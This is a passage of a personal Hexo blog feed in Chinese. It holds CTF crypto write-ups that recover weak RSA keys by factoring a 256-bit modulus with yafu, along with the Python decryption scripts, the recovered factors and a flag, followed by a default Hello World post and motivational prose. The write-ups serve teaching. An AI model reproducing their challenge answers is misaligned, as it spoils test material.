在此省略了</span><br></pre></td></tr></table></figure><ul><li>关于rsa</li></ul><blockquote><p>在RSA加密中，明文m通过公钥进行加密得到密文c，即c&#x3D;m^e mod n。在RSA解密中，密文c通过私钥进行解密得到明文m，即m&#x3D;c^d mod n。其中，n&#x3D;p<em>q，p和q均为大质数，e是与(p-1)</em>(q-1) 互质的数，d是e在模 (p-1)<em>(q-1) 意义下的逆元。*<em>加密m^e mod N &#x3D;c解密 c^d mod N &#x3D; m</em></em></p></blockquote><p>在RSA加密算法中，phi函数（也称欧拉函数）是一个重要的参数。phi函数的值是根据选择的两个质数p和q计算出来的。phi函数的含义是小于n的正整数中与n互质的数的个数，其中<strong>n&#x3D;p*q</strong>。phi函数的计算公式为：<strong>phi(n) &#x3D; (p-1) * (q-1)</strong></p><p>在这里他给出的时pq和qp，并且我们知道了n，而n&#x3D;pq，这里应该是大数相乘有偏差导致的，具体解决方法用pq*qp&#x2F;n</p><h2 id="2-编写后的脚本加密"><a href="#2-编写后的脚本加密" class="headerlink" title="2.编写后的脚本加密"></a>2.编写后的脚本加密</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse,long_to_bytes</span><br><span class="line">c= ‘’</span><br><span class="line">n= ‘’</span><br><span class="line">pq= ‘’</span><br><span class="line">qp= ‘’</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = pq*qp//n</span><br><span class="line"><span class="built_in">print</span>(phi)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="3运行脚本得到flag"><a href="#3运行脚本得到flag" class="headerlink" title="3运行脚本得到flag"></a>3运行脚本得到flag</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/55fd9903f379f9148eb7cc5d63413fb9.png" alt="img"></p><p>运行就可以得到flag了。</p><h1 id="二、攻防世界baigeiRSA"><a href="#二、攻防世界baigeiRSA" class="headerlink" title="二、攻防世界baigeiRSA"></a>二、攻防世界baigeiRSA</h1><p><img src="https://img-blog.csdnimg.cn/74b3dd0520354b2a8f2a9494618490c6.png#pic_center" alt="在这里插入图片描述"></p><h3 id="1-首先呢，下载附件-◡"><a href="#1-首先呢，下载附件-◡" class="headerlink" title="1.首先呢，下载附件.^◡^."></a>1.首先呢，下载附件.^◡^.</h3><p>附件给出了以下信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n = 88503001447845031603457048661635807319447136634748350130947825183012205093541</span><br><span class="line">c = 40876621398366534035989065383910105526025410999058860023908252093679681817257</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">size = <span class="number">128</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = number.getPrime(size)</span><br><span class="line">q = number.getPrime(size)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n = %d&#x27;</span> % n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = %d&#x27;</span> % c)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-分析代码-人-•͈ᴗ•͈-♡♡"><a href="#2-分析代码-人-•͈ᴗ•͈-♡♡" class="headerlink" title="2.分析代码(人 •͈ᴗ•͈) ♡♡"></a>2.分析代码(人 •͈ᴗ•͈) ♡♡</h3><p>通过给出的数据我们进行分析，我们首先分析这串代码</p><p>（1）import libnum:这里导入了libnum库，通过查询资料我们可以了解到关于libnum一些常用的知识：</p><blockquote><ul><li><strong><code>libnum.n2s(n)</code>: 将整数 <code>n</code> 转换为字符串。</strong></li><li><strong><code>libnum.s2n(s)</code>: 将字符串 <code>s</code> 转换为整数。</strong></li><li><strong><code>libnum.xor(s1, s2)</code>: 计算两个字符串 <code>s1</code> 和 <code>s2</code> 的异或结果。</strong></li><li><strong><code>libnum.invmod(a, m)</code>: 计算模数为 <code>m</code> 的整数 <code>a</code> 的乘法逆元。</strong></li><li><strong><code>libnum.factorize(n)</code>: 因数分解整数 <code>n</code>。</strong></li><li><strong><code>libnum.next_prime(n)</code>: 找到大于整数 <code>n</code> 的下一个素数。</strong></li></ul></blockquote><p>**（2）from Crypto.Util import number:**这从Crypto.Util包中导入了number模块，他提供了在加密中使用的各种数论函数。对应的也就是代码中的 **number.getPrime()<strong>和</strong>pow()**，但是pow()是python内置函数，所以不必使用完整的模块（Crypto.Util.number.pow()），只需使用number模块即可.Ծ‸Ծ </p><p><strong>(3)from secret import flag</strong>：这从名为 <code>secret.py</code> 的另一个文件中导入了 <code>flag</code> 变量。除非我们能够访问该文件，否则我们不知道 <code>flag</code> 的内容。</p><p>**(4)size&#x3D;128:<strong>意味着我们将使用</strong>Crypto.Util.number.getPrime()**函数生成两个大小为128位的随机素数p和q</p><p>**(5)e &#x3D; 65537:**这是一个常用的公共指数值，因为它是一个比较小 的素数，与大多数整数互质，而且计算速度较快。</p><p><strong>(6)n &#x3D; p*q</strong>：这计算 RSA 模数为 p 和 q的乘积。</p><p><strong>(7)m &#x3D; libnum.s2n(flag)</strong><code>：这使用 </code>libnum<code>库中的</code>s2n()函数将 &#96;flag 变量的内容（我们不知道其内容）从字符串转换为整数。</p><p>**(8)c &#x3D; pow(m, e, n)**：这使用 RSA 公钥 (n, e) 加密整数消息m。密文计算为 m的 e次幂模 n。</p><h3 id="3-yafu工具的使用•﹏•"><a href="#3-yafu工具的使用•﹏•" class="headerlink" title="3.yafu工具的使用•﹏•"></a>3.yafu工具的使用•﹏•</h3><p>下载网址：<a href="https://sourceforge.net/projects/yafu/">https://sourceforge.net/projects/yafu/</a></p><p>首先我们结合上面的数据知道<strong>n</strong>和<strong>c</strong>的数据，因为<strong>n&#x3D;p*q</strong>，所以我们就可以通过分解质因数求p和q，那么推荐的工具肯定当选yafu.</p><blockquote><p><strong><code>yafu</code> 是一个用于数学计算的开源软件，它是一个快速的因数分解工具，可以用于分解大整数。它使用了多种算法来分解整数，包括 Pollard rho、Quadratic sieve 和 Number field sieve 等算法。<code>yafu</code> 还包含其他一些工具，例如计算最大公因数、计算模逆元、计算离散对数等等。</strong></p></blockquote><p>我们在下载后，解压到一个文件夹里，在文件夹里我们打开PowerShell，首先输入**.\yafu-x64.exe**接着输入factor（要分解的数）等一段时间。。。咦！好了！</p><p><img src="https://img-blog.csdnimg.cn/0222df4e32be4712866af24d914ffa7e.png#pic_center" alt="在这里插入图片描述">得出p和q是分别其中的一个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P39 = 274539690398523616505159415195049044439</span><br><span class="line">P39 = 322368694010594584041053487661458382819</span><br></pre></td></tr></table></figure><h3 id="4-总结数据˃̣̣̥᷄⌓˂̣̣̥᷅"><a href="#4-总结数据˃̣̣̥᷄⌓˂̣̣̥᷅" class="headerlink" title="4.总结数据˃̣̣̥᷄⌓˂̣̣̥᷅"></a>4.总结数据˃̣̣̥᷄⌓˂̣̣̥᷅</h3><p>那么我们进行小总结</p><p>我们可以获得</p><blockquote><p><strong>p&#x3D;274539690398523616505159415195049044439</strong></p><p><strong>q&#x3D;322368694010594584041053487661458382819</strong></p><p><strong>n &#x3D; 88503001447845031603457048661635807319447136634748350130947825183012205093541</strong><br>       <strong>c &#x3D; 40876621398366534035989065383910105526025410999058860023908252093679681817257</strong></p></blockquote><h3 id="5-编写脚本’◡’"><a href="#5-编写脚本’◡’" class="headerlink" title="5.编写脚本’◡’"></a>5.编写脚本’◡’</h3><p>已知p、q、n、c我们编写代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2  <span class="comment"># 导入高精度计算库gmpy2</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes  <span class="comment"># 导入将长整数转换为字节串的工具函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义RSA公钥和密文</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">40876621398366534035989065383910105526025410999058860023908252093679681817257</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义RSA算法中使用的两个大素数p和q，以及模数n和欧拉函数值phi_n</span></span><br><span class="line">p = <span class="number">322368694010594584041053487661458382819</span></span><br><span class="line">q = <span class="number">274539690398523616505159415195049044439</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算RSA私钥中的解密指数</span></span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用RSA算法解密密文c，得到明文m</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将解密后的长整数m转换为字节串，并输出到屏幕上</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/1a26f306b4eb4e569fc14ac9698b2b4f.png#pic_center" alt="在这里插入图片描述"></p><p>运行之后得到flag为HSCTF{@Zh3n_Ba1_G3i!@}</p><h3 id="6-关于RSA小故事"><a href="#6-关于RSA小故事" class="headerlink" title="6.关于RSA小故事"></a>6.关于RSA小故事</h3><blockquote><p><strong>RSA是一种非对称加密算法，由Ron Rivest、Adi Shamir和Leonard Adleman三位密码学家在1977年共同发明。RSA算法的安全性基于大整数分解的困难性，它可以用于实现数字签名、密钥交换、数据加密等安全通信功能。</strong></p><p><strong>RSA算法的原理是基于数论中的欧拉定理和费马小定理。具体来说，RSA算法的公钥和私钥分别由以下参数组成：</strong></p><ol><li><strong>公钥：加密指数（e）和模数（n）；</strong></li><li><strong>私钥：解密指数（d）和模数（n）。</strong></li></ol><p><strong>RSA算法的加密过程如下：</strong></p><ol><li><strong>将明文m转换为一个大整数M；</strong></li><li><strong>使用公钥中的加密指数e和模数n，计算密文C &#x3D; M^e mod n；</strong></li><li><strong>将密文C发送给接收方。</strong></li></ol><p><strong>RSA算法的解密过程如下：</strong></p><ol><li><strong>接收到密文C；</strong></li><li><strong>使用私钥中的解密指数d和模数n，计算明文M &#x3D; C^d modn；</strong></li><li><strong>将明文M转换为原始的明文m。</strong></li></ol><p><strong>需要注意的是，在RSA算法中，加密指数e和解密指数d是一对互为逆元的数，即d * e &#x3D; 1 mod phi(n)，其中phi(n)表示欧拉函数值。因此，只有私钥持有者才能够计算出解密指数d，从而解密密文。同时，RSA算法的安全性基于大整数分解的困难性，即对于一个大的合数n，找到它的质因数p和q是一个非常困难的问题，这保证了RSA算法在当前的计算能力下是安全的。</strong></p><p><strong>除了基本的RSA加密和解密，RSA算法还有许多变种和扩展，比如加密填充方案、签名方案、密钥生成方案等。RSA算法的应用非常广泛，包括SSL&#x2F;TLS协议、数字证书、电子邮件加密、数字签名等领域。</strong></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcom&lt;/p&gt;
&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h1 id=&quot;一、攻防世界Crypto-初识rsa&quot;&gt;&lt;a href=&quot;#一、攻防世界Crypto-初识rsa&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2023/02/25/hello-world/"/>
    <id>http://example.com/2023/02/25/hello-world/</id>
    <published>2023-02-25T02:55:57.729Z</published>
    <updated>2023-03-13T21:55:03.442Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><p><strong>三万六千日，夜夜当秉烛，白日何短短，百年若易海。</strong></p><p><strong>当你两手握着沙子的时候，你也就一定拿不到地上的那颗明珠了。</strong></p><p><strong>为人如立山千仞，为学如海纳百川信心无畏，良心无愧，青春无悔撑开自信的帆，破浪向前，展示搏击风采坚定的信念持久的勤奋科学的方法成功人生能有几回搏，此时不搏待何时细节决定成败，拼搏铸就人生。</strong></p><p><strong>鹰爱高飞，鸦栖一枝。鸟贵有翼，人贵有志。靠山山会倒，靠水水会流，靠自己永远不倒。欲望以提升热忱，毅力以磨平高山。只要路是对的，就不怕路远</strong>。</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><p><strong>社会是大海，人生是小舟，理想和信念就是引航的&#96;灯塔和推进的风帆。咱们在大学期间不仅仅要提高知识水平，更要坚定科学崇高的理想信念。然而理想不等于现实，理想的实现往往要透过1条充满艰难险阻的曲折之路，有赖于脚踏实地，持之以恒的奋斗。只有实践才是通往理想彼岸的桥梁</strong>。</p><p><strong>治学要耐得住寂寞，做人须经得起风雨。贵人之心责已，则宽；利己之心利人，则容。信念是人生之车的轮，理想是人生之舟的帆。成功终究是昨夜星辰，勤奋却是不熄的明灯。有作为，十年胜百年；无目标，百岁犹一岁。骨气、正气、与气，气爽神清；诚心、意心、热心，心宽体健。</strong></p><p><strong>正能量就像给自己插上翅膀，才能飞得更高；炼造一双千里眼，才能望得更远。满载而行，即使困难重重，留下的汗水也终会获得回报；满载而行，即使艰辛与泪水并存，前方的道路也依然光明；满载而行，即使跌倒，也将有勇气迈向成功。</strong></p><p><strong>我们怀揣火种走过黑暗长夜，跨过战友的遗骸，踏过荆棘和深渊，最终在累累尸骨上重新点燃了种族延续的火炬。我们这些活下来的人不需要历史来记载功勋，也无谓那些空虚华美的称颂;只要山川河流、千万英灵，见证过我们前仆后继的跋涉，和永不放弃的努力。</strong></p><blockquote><p>外面下着大雨，潮湿的空气令我难受，不知道过了几刻钟，我也不知道自己在干什么，似乎是在发愣，可是发愣也不是如此——思绪如麻，剪不断，理还乱。脑子里装满了噪音，我不知道自己还有多少天才能熬过头。外面的雨似乎是发现了小草有点讨厌自己了，开始离去。风雨过后，理应是美好的时候，阳光出来了，彩虹也时隐时现。听不见了这烦人的雨声，我开始朝门口走去，当我触碰到第一缕阳光的时候，我感觉到的不是光明的日子，而是一种极端的另一种日子。我似乎忘记了它原本所拥有的温度了，此时的我我只感受到了痛苦，望着不惹人爱的外面，我还是走了出去，阳光刺着我的双眼、空气抓住我的喉咙，似乎一撇一捺组成的不是那个字，而是X，似乎我不该过来。在房子里，找不出一点任何的意义，只有抱膝灯前影伴身。外面天气十分的晴朗，小鸟在欢唱、小花在跳舞。而身处房子里的我，似乎并不是很喜欢这种场景，外面耀眼的阳光却无法除去房子里的阴影。或许这就是人生吧。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a hre</summary>
      
    
    
    
    
  </entry>
  
</feed>
